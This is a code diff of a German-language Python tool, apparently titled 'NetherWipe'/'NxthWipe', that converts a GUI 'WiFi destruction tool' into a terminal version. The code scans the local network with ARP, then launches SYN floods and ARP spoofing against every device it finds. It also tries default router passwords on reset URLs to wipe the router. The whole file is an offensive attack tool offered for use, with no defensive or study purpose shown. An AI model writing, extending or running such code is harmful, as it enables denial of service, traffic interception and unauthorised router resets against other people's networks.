@@ -3,42 +3,22 @@
 import threading
 import time
 import random
-from tkinter import *
-from tkinter import scrolledtext, messagebox
+import os
+import sys
 from scapy.all import IP, TCP, send, srp, ARP, Ether, conf
 
 conf.verb = 0
 
-class NetherWipe:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("NetherWipe v1.0")
-        self.root.geometry("600x500")
-        self.root.configure(bg="#1e1e2e")
+class NxthWipeCLI:
+    def __init__(self):
         self.running = True
+        self.attack_threads = []
 
-        Label(root, text="NetherWipe – WiFi Zerstörungstool", font=("Helvetica", 16, "bold"), bg="#1e1e2e", fg="#ff5555").pack(pady=10)
-
-        frame = Frame(root, bg="#1e1e2e")
-        frame.pack(pady=10)
-
-        Label(frame, text="Router IP:", bg="#1e1e2e", fg="white", font=("Helvetica", 12)).grid(row=0, column=0, padx=5)
-        self.ip_entry = Entry(frame, width=20, font=("Helvetica", 12))
-        self.ip_entry.grid(row=0, column=1, padx=5)
-        self.ip_entry.insert(0, "192.168.1.1")
-
-        self.go_button = Button(root, text="🔥 ZERSTÖREN 🔥", command=self.start_attack, bg="#ff5555", fg="white", font=("Helvetica", 14, "bold"))
-        self.go_button.pack(pady=20)
-
-        self.log_area = scrolledtext.ScrolledText(root, width=70, height=20, bg="#2d2d3a", fg="#00ff99", font=("Courier", 10))
-        self.log_area.pack(pady=10)
-
-        self.log("NetherWipe gestartet – von LXXNDX-PXNDX")
+    def clear_screen(self):
+        os.system('clear' if os.name == 'posix' else 'cls')
 
     def log(self, msg):
-        self.log_area.insert(END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
-        self.log_area.see(END)
-        self.root.update()
+        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
 
     def get_network_range(self, router_ip):
         parts = router_ip.split('.')
@@ -52,7 +32,6 @@ class NetherWipe:
         return [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
 
     def syn_flood(self, target_ip, duration=30):
-        self.log(f"SYN Flood auf {target_ip} für {duration}s")
         end_time = time.time() + duration
         while time.time() < end_time and self.running:
             sport = random.randint(1024, 65535)
@@ -85,19 +64,14 @@ class NetherWipe:
                 f"http://{router_ip}/goform/reset"]
         defaults = [("admin","admin"), ("admin",""), ("root","admin"), ("user","user")]
         for url in urls:
-            for user,pw in defaults:
+            for user, pw in defaults:
                 try:
-                    requests.get(url, auth=HTTPBasicAuth(user,pw), timeout=2)
+                    requests.get(url, auth=HTTPBasicAuth(user, pw), timeout=2)
                     self.log(f"Reset versucht: {url}")
                 except:
                     pass
 
-    def start_attack(self):
-        router_ip = self.ip_entry.get().strip()
-        if not router_ip:
-            messagebox.showerror("Fehler", "Bitte Router IP eingeben")
-            return
-        self.go_button.config(state=DISABLED)
+    def start_attack(self, router_ip):
         self.running = True
         self.log(f"Starte Zerstörung auf Router {router_ip}")
         network = self.get_network_range(router_ip)
@@ -105,18 +79,44 @@ class NetherWipe:
         devices = self.arp_scan(network)
         self.log(f"Gefunden: {len(devices)} Geräte")
         for dev in devices:
-            threading.Thread(target=self.syn_flood, args=(dev['ip'], 60), daemon=True).start()
-            threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip), daemon=True).start()
+            t1 = threading.Thread(target=self.syn_flood, args=(dev['ip'], 60), daemon=True)
+            t2 = threading.Thread(target=self.arp_spoof, args=(dev['ip'], router_ip), daemon=True)
+            t1.start()
+            t2.start()
+            self.attack_threads.extend([t1, t2])
             time.sleep(0.5)
-        threading.Thread(target=self.router_reset, args=(router_ip,), daemon=True).start()
-        self.log("Alle Angriffe gestartet")
-
-    def stop(self):
+        t_reset = threading.Thread(target=self.router_reset, args=(router_ip,), daemon=True)
+        t_reset.start()
+        self.attack_threads.append(t_reset)
+        self.log("Alle Angriffe gestartet. Drücke Enter, um zu stoppen.")
+        input()
         self.running = False
         self.log("Stoppe Angriffe...")
+        sys.exit(0)
+
+    def run(self):
+        self.clear_screen()
+        print("""
+╔═══════════════════════════════════════╗
+║       NxthWipe – Terminal Edition     ║
+║         von LXXNDX-PXNDX              ║
+╚═══════════════════════════════════════╝
+""")
+        router_ip = input("Router IP (z.B. 192.168.1.1): ").strip()
+        if not router_ip:
+            print("Keine IP eingegeben.")
+            return
+        print("\nAngriff startet in 3 Sekunden... Drücke Ctrl+C zum Abbrechen.\n")
+        time.sleep(3)
+        try:
+            self.start_attack(router_ip)
+        except KeyboardInterrupt:
+            self.running = False
+            print("\nAbgebrochen.")
 
 if __name__ == "__main__":
-    root = Tk()
-    app = NetherWipe(root)
-    root.protocol("WM_DELETE_WINDOW", app.stop)
-    root.mainloop()
+    if os.geteuid() != 0:
+        print("Dieses Tool benötigt root-Rechte. Starte mit: sudo python3 NxthWipe.py")
+        sys.exit(1)
+    cli = NxthWipeCLI()
+    cli.run()
